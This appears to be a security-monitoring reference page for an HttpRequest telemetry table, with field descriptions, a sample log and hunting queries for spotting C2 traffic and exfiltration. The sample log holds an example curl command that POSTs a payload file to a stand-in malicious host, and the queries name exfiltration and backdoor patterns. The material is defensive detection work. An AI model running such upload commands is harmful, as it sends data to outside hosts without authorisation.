## HttpRequest Table: HTTP Request Event

### 1. Table Name
**HttpRequest**

---

### 2. Table Usage
This table records outbound HTTP requests initiated by processes on Linux and macOS systems. It provides details about the request, including the method, host, path, and originating process, which is useful for monitoring web activity, detecting C2 communications, or identifying data exfiltration.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| HttpPath | The path part of the HTTP request URL. | Linux, macOS |
| HttpHost | The host (domain name or IP address) to which the HTTP request was sent. | Linux, macOS |
| HttpMethod | The HTTP method used for the request (e.g., GET, POST, PUT). | Linux, macOS |
| RemoteAddressIP4 | The IPv4 address of the remote host to which the connection was made. | Linux, macOS |
| RemotePort | The remote port number used for the connection. | Linux, macOS |
| ImageFileName | The full path to an executable (PE) file. The context of this field provides more information as to its meaning. For ProcessRollup2 events, this is the full path to the main executable for the created process. | Linux, macOS |
| CommandLine | The command line used to create this process. May be empty in some circumstances. | Linux, macOS |

---

### 4. Sample Log Example

```json
{
  "HttpPath": "/api/v1/data",
  "HttpHost": "malicious.example.com",
  "HttpMethod": "POST",
  "RemoteAddressIP4": "192.0.2.100",
  "RemotePort": "443",
  "ImageFileName": "/usr/bin/curl",
  "CommandLine": "curl -X POST [https://malicious.example.com/api/v1/data](https://malicious.example.com/api/v1/data) -d @payload.json"
}
```
---

### 5. Example Queries
```xql
// Find all HTTP POST requests to a specific host
event_simpleName=HttpRequest HttpMethod=HTTP_METHOD_POST HttpHost="malicious.example.com"

// Identify HTTP requests originating from a suspicious image file
event_simpleName=HttpRequest ImageFileName="/usr/local/bin/backdoor_app"

// Find HTTP requests to a specific IP address on a given port
event_simpleName=HttpRequest RemoteAddressIP4="192.0.2.100" RemotePort="8080"

// Search for HTTP requests with specific keywords in the path or command line
event_simpleName=HttpRequest HttpPath="*exfil*" OR CommandLine="*upload_data*"

// Discover HTTP requests where HttpHost contains an unusual domain pattern
event_simpleName=HttpRequest HttpHost="*.xyz" OR HttpHost="*.top"
```
---